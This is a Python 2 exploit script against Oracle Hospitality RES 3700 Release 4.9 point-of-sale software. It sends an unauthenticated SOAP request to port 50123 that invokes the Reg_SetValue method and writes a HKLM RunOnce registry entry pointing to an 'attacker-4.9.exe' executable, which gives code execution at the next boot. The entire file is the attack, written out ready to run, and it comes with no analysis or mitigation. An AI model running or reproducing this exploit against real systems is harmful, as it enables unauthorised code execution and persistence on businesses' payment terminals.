#!/usr/bin/env python

#Author: Walid Faour
#Date: Aug. 2, 2019
#Oracle Hospitality RES 3700 Release 4.9 Exploit

import binascii
import requests

print
print '-------------------------------------------------'
print 'Oracle Hospitality RES 3700 Release 4.9 - Exploit'
print '-------------------------------------------------'
print

IP = raw_input("Enter the IP address: ")
URL = "http://" + IP + ":50123"
    
def create_run_registry():
	body = '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"> \
            <SOAP-ENV:Body xmlns:MCRS-ENV="MCRS-URI"> \
                <MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service> \
                <MCRS-ENV:Method>Reg_SetValue</MCRS-ENV:Method> \
                <MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey> \
                <MCRS-ENV:InputParameters> \
                    <Key>SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</Key> \
                    <KeyType>HKEY_LOCAL_MACHINE</KeyType> \
                    <vtype>REG_SZ</vtype> \
                    <KeyName>RunThis</KeyName> \
                    <KeyVal>C:\Windows\System32\attacker-4.9.exe</KeyVal> \
                    <KOvrWrte>T</KOvrWrte> \
                </MCRS-ENV:InputParameters> \
        </SOAP-ENV:Body></SOAP-ENV:Envelope>'
    return body
    
def exploit_headers(body):
	headers = {
		"Content-Type" : "text/xml",
		"User-Agent" : "MDS POS Client",
		"Host" : IP + ":50123",
		"Content-Length" : str(len(body)),
		"Connection" : "Keep-Alive"
	}
	return headers
print 'Exploiting Oracle Hospitality RES 3700 at IP address ' + IP + '...'
body_registry = create_run_registry()
send_payload = requests.post(URL,data=body_registry,headers=exploit_headers(body_registry))

